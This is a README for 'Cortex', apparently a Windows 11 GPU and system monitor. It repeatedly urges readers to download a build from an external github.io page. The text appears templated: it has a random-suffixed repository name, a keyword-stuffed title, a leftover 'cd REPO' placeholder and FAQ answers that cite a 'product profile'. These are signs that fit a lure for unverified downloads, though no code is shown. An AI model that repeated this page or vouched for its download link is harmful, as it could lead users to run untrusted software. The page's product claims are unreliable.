# Cortex v2026 - system monitor 2026

> **Cortex is a Windows 11 desktop system monitor for GPU-heavy work, combining NVIDIA-focused telemetry, TensorBoard visibility, and local-only processing in a native Rust + Tauri app.**

[![Platform](https://img.shields.io/badge/Platform-Windows%2011-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucas-jung59/cortex-win-88515?style=flat-square)](https://github.com/lucas-jung59/cortex-win-88515)

---

<p align="center">
  <a href="https://lucas-jung59.github.io/cortex-win-88515/">
    <img src="https://img.shields.io/badge/Download-Cortex%20Latest-brightgreen?style=for-the-badge" alt="Download Cortex">
  </a>
</p>

> **[Direct Download - Cortex v2026](https://lucas-jung59.github.io/cortex-win-88515/)**

---

[Download Latest Build](https://lucas-jung59.github.io/cortex-win-88515/)

---

## About Cortex

Cortex is built for people who need a clear view of machine performance during training, inference, or other demanding workloads. It centers NVIDIA GPU visibility while still tracking the rest of the system, so CPU, memory, disk, and network activity can be reviewed from one desktop app.

The app is designed to stay local, making telemetry available on the machine without sending measured data elsewhere. With live charts, detailed panels, and a card-based dashboard, Cortex helps users follow hardware behavior in a format that is easier to read during active work.

---

## Features

- GPU-first monitoring focused on NVIDIA hardware
- CPU, memory, disk, and network telemetry in one view
- TensorBoard integration for training workflow context
- Local-only data processing on the device
- Native desktop experience powered by Rust and Tauri
- Customizable card dashboard for arranging the information you care about
- Live charts for quick trend spotting
- Detailed views for deeper inspection of telemetry

---

## Installation

1. Download the latest build from the project page or clone the repository locally.
2. If you are building from source, make sure your Windows 11 environment has the required Rust and Tauri toolchain available.
3. Launch the desktop app after installation or start it from the project directory if you are running a development build.

Example source setup:

```bash
git clone https://github.com/lucas-jung59/cortex-win-88515.git
cd REPO
```

Then open or run the app using your preferred Rust/Tauri workflow for the project.

---

## Usage

Open Cortex and let it detect the system telemetry it can display. Use the dashboard to review GPU activity first, then move into CPU, memory, disk, and network details when you need broader context.

Typical workflow:

1. Start the app on the target Windows 11 machine.
2. Review NVIDIA GPU metrics during training or other workloads.
3. Check TensorBoard alongside live system telemetry.
4. Switch between cards, charts, and detailed views as needed.

If you use this while training models, keep it open on the same machine so the local telemetry and TensorBoard view stay close to the workload you are monitoring.

---

## Configuration

Cortex is intended to keep processing on the local machine. Dashboard layout and display preferences are handled within the app itself, so configuration is primarily a matter of arranging the cards and views you want to see.

If the project adds external settings later, keep them in the repository's documented configuration location or in the app's own settings area. For now, use the in-app controls to tailor the monitoring layout.

---

## Requirements

- Windows 11
- NVIDIA GPU support for the GPU-focused monitoring features
- A desktop environment capable of running a native Tauri application
- Rust toolchain if you plan to build from source
- Enough local storage for the application and any project data you keep alongside it

---

## FAQ

**Does Cortex send telemetry off the machine?**  
No. The product profile describes local-only data processing.

**Can I use it for training machines?**  
Yes. It is positioned for GPU-heavy training workflows and includes TensorBoard integration.

**What kind of hardware does it focus on?**  
It is centered on NVIDIA GPUs, while also reporting CPU, memory, disk, and network telemetry.

**How do I update it?**  
Use the latest build download link above or rebuild from source when new changes are published.

**Where do I change the dashboard?**  
Adjust the card dashboard and view layout inside the app.

**I am having trouble launching it. What should I check?**  
Confirm that you are on Windows 11 and that the required Rust/Tauri build tools are installed if you are running from source.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
